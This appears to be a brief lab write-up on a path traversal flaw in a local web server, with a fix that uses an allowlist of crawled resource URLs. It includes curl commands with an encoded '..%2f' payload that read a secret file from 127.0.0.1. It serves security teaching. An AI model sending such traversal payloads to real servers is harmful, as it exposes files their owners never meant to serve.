# Path traversal

## exploit

To access unauthorized files, path traversal can be used with

`curl http://127.0.0.1:8008/..%2f/secret.txt`
giving : 
`Cookie!`

`curl http://127.0.0.1:8008/dump.gtl`

## Fix
Fixed by adding a list of authorized urls. 
This list is generated by crawling the resource folder for files 
Then when files are uploaded, the url checker crawls in the resource folder to check for newly added content
